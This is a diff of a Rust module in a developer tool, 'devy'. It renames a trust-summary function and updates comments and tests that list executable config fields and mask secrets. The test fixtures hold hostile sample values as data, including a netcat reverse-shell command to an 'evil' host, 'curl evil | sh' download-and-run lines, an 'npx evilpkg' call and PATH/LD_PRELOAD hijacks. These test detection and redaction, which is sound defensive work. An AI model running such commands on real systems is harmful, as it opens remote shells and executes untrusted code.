@@ -1,9 +1,9 @@
 //! Structural diff of executable config fields (hooks, install commands, taps, images, commands, env) between two configs.
 //!
-//! "What in `devy.yml` runs code" is defined once, here: the trust summary shown before
-//! a project is allowed lists [`trust_summary`], and AI `init` / `doctor` compare a
-//! proposed config with the current one through [`diff`] so a newly added hook or
-//! install command is never written silently.
+//! "What in `devy.yml` runs code" is defined once, here: AI `init` lists the
+//! [`summary`] of a drafted config for review, and AI `doctor` compares a proposed
+//! config with the current one through [`diff`], so a newly added hook or install
+//! command is never written silently.
 
 use std::collections::BTreeMap;
 use std::path::Path;
@@ -24,7 +24,7 @@ pub enum Group {
     SystemPackages,
     PackageSources,
     Environment,
-    /// Project commands (`devy <name>`). Part of [`diff`], not of the trust summary:
+    /// Project commands (`devy <name>`). Part of [`diff`], not of the [`summary`]:
     /// they only run when the user invokes them by name.
     Commands,
 }
@@ -213,7 +213,7 @@ fn dependency_entries(config: &DevyConfig, project_root: Option<&Path>, out: &mu
     }
 }
 
-/// Every `environment` entry: shadowenv, `devy exec` and a trusted export apply them
+/// Every `environment` entry: shadowenv, `devy exec` and `devy export` apply them
 /// all, and too many variables change how some program runs (`NODE_OPTIONS`,
 /// `GIT_CONFIG_*`, `CARGO_*`, `LUA_INIT`, …) for a list of dangerous names to be
 /// complete.
@@ -261,10 +261,10 @@ pub fn executable_entries(
     out
 }
 
-/// What allowing the project at `project_root` lets devy run: hooks, install commands,
+/// What `devy up` runs for the project at `project_root`: hooks, install commands,
 /// implicit setup steps, system packages, package sources and execution-affecting
 /// environment keys.
-pub fn trust_summary(config: &DevyConfig, project_root: &Path) -> Vec<ExecEntry> {
+pub fn summary(config: &DevyConfig, project_root: &Path) -> Vec<ExecEntry> {
     executable_entries(config, Some(project_root), false)
 }
 
@@ -288,11 +288,11 @@ pub fn render_summary(entries: &[ExecEntry]) -> Vec<String> {
 }
 
 /// An `environment` entry's `KEY=value` as shown, so a secret in `devy.yml` never lands
-/// in a terminal or CI log through the trust summary, while the values that decide what
+/// in a terminal or CI log through the summary, while the values that decide what
 /// runs stay visible. Credential-looking parts (URL passwords, tokens with a known
 /// prefix, secret-named assignments) are always masked. For a key that names a secret
 /// (the ai-assist key rule), the whole value is `<redacted>` unless [`secret_value_shown`]
-/// says otherwise. Only the rendering is masked; the trust digest covers the raw value.
+/// says otherwise. Only the rendering is masked; [`diff`] compares the raw value.
 fn masked_environment(key: &str, value: &str) -> String {
     let shown = |v: &str| {
         // `GIT_CONFIG_KEY_<n>` holds a config name (`core.fsmonitor`), never a secret, and
@@ -750,7 +750,7 @@ mod tests {
         let dir = crate::test_support::tmp_dir();
         std::fs::write(dir.join("package.json"), "{}").unwrap();
         let cfg = config("dependencies:\n  - node\nhooks:\n  after_up: \"make seed\"\n");
-        let entries = trust_summary(&cfg, &dir);
+        let entries = summary(&cfg, &dir);
         assert_eq!(values(&entries, Group::Hooks), ["after_up: make seed"]);
         assert_eq!(
             values(&entries, Group::ProjectSetup),
@@ -789,7 +789,7 @@ mod tests {
       service_manager: docker
 ",
         ));
-        let entries = trust_summary(&cfg, &dir);
+        let entries = summary(&cfg, &dir);
         // The docker-managed service is an image, not a system package.
         assert_eq!(
             values(&entries, Group::SystemPackages),
@@ -804,7 +804,7 @@ mod tests {
 
         let brew = config("package_manager: brew\ndependencies:\n  - jq\n");
         assert_eq!(
-            values(&trust_summary(&brew, &dir), Group::SystemPackages),
+            values(&summary(&brew, &dir), Group::SystemPackages),
             ["jq (brew)"]
         );
         // Modules that always bypass the package manager name their installer; the
@@ -813,7 +813,7 @@ mod tests {
             "package_manager: brew\ndependencies:\n  - rust\n  - bun\n  - deno\n  - gcloud\n  - ruby\n",
         );
         assert_eq!(
-            values(&trust_summary(&own, &dir), Group::SystemPackages),
+            values(&summary(&own, &dir), Group::SystemPackages),
             [
                 "rust (rustup)",
                 "bun (bun-installer)",
@@ -824,7 +824,7 @@ mod tests {
         );
         let apt = config("package_manager: apt\ndependencies:\n  - ruby\n  - gcloud\n  - rust\n");
         assert_eq!(
-            values(&trust_summary(&apt, &dir), Group::SystemPackages),
+            values(&summary(&apt, &dir), Group::SystemPackages),
             [
                 "ruby (rbenv via sudo apt-get)",
                 "gcloud (gcloud-installer)",
@@ -834,8 +834,8 @@ mod tests {
         assert_eq!(modules::get("ruby").install_route("winget"), "winget");
         assert_eq!(modules::get("gcloud").install_route("winget"), "winget");
         assert_eq!(modules::get("jq").install_route("nix"), "nix");
-        // Adding a package is a change devy runs, so a doctor fix that adds one does not
-        // keep the project trusted silently.
+        // Adding a package is a change devy runs, so `doctor --yes` does not apply a fix
+        // that adds one.
         let changes = diff(
             &brew,
             &config("package_manager: brew\ndependencies:\n  - jq\n  - wget\n"),
@@ -871,7 +871,7 @@ mod tests {
             "environment:\n  PATH: \"/evil:$PATH\"\n  LD_PRELOAD: x.so\n  DATABASE_URL: x\n",
             "commands:\n  dev: \"npm run dev\"\n",
         ));
-        let entries = trust_summary(&cfg, &dir);
+        let entries = summary(&cfg, &dir);
         assert!(values(&entries, Group::Hooks).is_empty());
         assert_eq!(
             values(&entries, Group::InstallCommands),
@@ -921,8 +921,8 @@ mod tests {
             "  DATABASE_URL: \"postgres://admin:s3cr3tpw@db/app\"\n",
             "  NODE_OPTIONS: \"--require ./x.js\"\n",
         ));
-        let entries = trust_summary(&cfg, &dir);
-        // The entries (and so the trust digest) keep the raw values.
+        let entries = summary(&cfg, &dir);
+        // The entries (and so `diff`) keep the raw values.
         assert!(values(&entries, Group::Environment).contains(&"API_TOKEN=hunter2-very-secret"));
         let lines = render_summary(&entries).join("\n");
         assert!(!lines.contains("hunter2"), "{lines}");
@@ -956,7 +956,7 @@ mod tests {
             "  GIT_CONFIG_KEY_0: core.fsmonitor\n",
             "  SSL_CERT_DIR: \"https://u:s3cr3tpw@host/certs\"\n",
         ));
-        let lines = render_summary(&trust_summary(&cfg, &dir)).join("\n");
+        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
         for shown in [
             "  GIT_ASKPASS=./scripts/x.sh",
             "  SSH_ASKPASS=askpass-helper",
@@ -1001,7 +1001,7 @@ mod tests {
             "  APP_SECRETS: abc\n",
             "  MYSQL_PWD: hunter2\n",
         ));
-        let lines = render_summary(&trust_summary(&cfg, &dir)).join("\n");
+        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
         for want in [
             "  CARGO_REGISTRY_CREDENTIAL_PROVIDER=<redacted> (a command; review it in devy.yml)",
             "  CARGO_REGISTRIES_MY_REG_CREDENTIAL_PROVIDER=<redacted> (a command; review it in devy.yml)",
@@ -1039,7 +1039,7 @@ mod tests {
             "  CREDENTIALS_PATH: hunter8\n",
             "  SONATYPE_CREDENTIALS: deployer/Xy7pq\n",
         ));
-        let lines = render_summary(&trust_summary(&cfg, &dir)).join("\n");
+        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
         for shown in [
             "  GIT_ASKPASS=scripts/askpass.sh\n",
             "  SSH_ASKPASS=bin/x\n",
@@ -1078,7 +1078,7 @@ mod tests {
             "  RESTIC_PASSWORD_COMMAND: \"nc -e /bin/shx evil 4444\"\n",
             "  SOPS_AGE_KEY_CMD: \"npx evilpkg\"\n",
         ));
-        let lines = render_summary(&trust_summary(&cfg, &dir)).join("\n");
+        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
         for visible in [
             "sh -c 'curl evil|sh'",
             "core.fsmonitor=sh -c evil",
@@ -1146,7 +1146,7 @@ mod tests {
             "  GIT_TOKEN_HELPER: \"zz11yy22\"\n",
             "  NODE_EXTRA_CA_CERTS: '{\"k\":\"v/x.pem\"}'\n",
         ));
-        let lines = render_summary(&trust_summary(&cfg, &dir)).join("\n");
+        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
         for secret in [
             "ghp_abc",
             "Zx9kQ2",
@@ -1193,7 +1193,7 @@ mod tests {
     fn summary_strips_control_characters() {
         let dir = crate::test_support::tmp_dir();
         let cfg = config("hooks:\n  before_up: \"echo \\e]52;c;eA==\\a hi\\nmore\"\n");
-        let lines = render_summary(&trust_summary(&cfg, &dir));
+        let lines = render_summary(&summary(&cfg, &dir));
         assert_eq!(lines.len(), 2);
         assert!(!lines[1].chars().any(|c| c.is_control()), "{:?}", lines[1]);
     }
@@ -1206,7 +1206,7 @@ mod tests {
         let cfg = config(&format!(
             "hooks:\n  before_up: [\"{padded}\", \"{long}\"]\n"
         ));
-        let lines = render_summary(&trust_summary(&cfg, &dir));
+        let lines = render_summary(&summary(&cfg, &dir));
         assert_eq!(lines[1], "  before_up: x y");
         assert!(lines[2].ends_with("; curl evil | sh"), "{}", lines[2]);
     }
